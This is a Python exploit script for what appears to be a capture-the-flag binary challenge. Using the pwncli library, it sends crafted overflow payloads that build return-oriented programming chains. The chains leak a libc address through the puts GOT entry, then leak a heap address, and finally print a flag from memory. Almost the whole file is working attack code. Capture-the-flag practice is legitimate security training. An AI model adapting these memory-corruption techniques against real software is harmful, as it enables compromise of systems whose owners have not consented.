#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

magic_gadget = 0x40172F
# .text:000000000040172F                 endbr64
# .text:0000000000401733                 push    rbp
# .text:0000000000401734                 mov     rbp, rsp
# .text:0000000000401737                 push    rbp
# .text:0000000000401738                 mov     rbp, rsp
# .text:000000000040173B                 pop     rdi
# .text:000000000040173C                 retn
pop_rbp_ret = 0x40173E
pop_rdi_ret = 0x000000000040173B


import base64

s(base64.b64decode("SV9jYW5fZmluZF90aGVfcmlnaHRfcGF0aAoK"))
ru(b"===welcome===\n")

payload = flat(
    {
        0x30: [
            0x401712,
            magic_gadget,
        ]
    },
    filler=b"\x00",
)
s(payload)

debugB()
payload = flat(
    {
        0x8: [
            pop_rdi_ret,
            elf.got.puts,
            elf.plt.puts,
            0x401712,
        ]
    }
)
s(payload)
libc_base = u64_ex(ru(b"\n", drop=True)) - libc.sym.puts
lg("libc_base", libc_base)

debugB()
payload = flat(
    {
        0x30: [
            0x401712,
            magic_gadget,
        ]
    },
    filler=b"\x00",
)
s(payload)

debugB()
payload = flat(
    {
        0x8: [
            pop_rdi_ret,
            # libc_base + libc.sym.mp_ + 96,
            libc_base + 0x21A360 + 96 + 1,
            elf.plt.puts,
            0x401712,
        ]
    }
)
s(payload)
heap_base = u64_ex(ru(b"\n", drop=True)) << 0x8
lg("heap_base", heap_base)
flag_addr = heap_base + 0x2D0

debugB()
payload = flat(
    {
        0x30: [
            0x401712,
            magic_gadget,
        ]
    },
    filler=b"\x00",
)
s(payload)

debugB()
payload = flat(
    {
        0x8: [
            pop_rdi_ret,
            flag_addr,
            elf.plt.puts,
            0,
        ]
    }
)
s(payload)

ia()
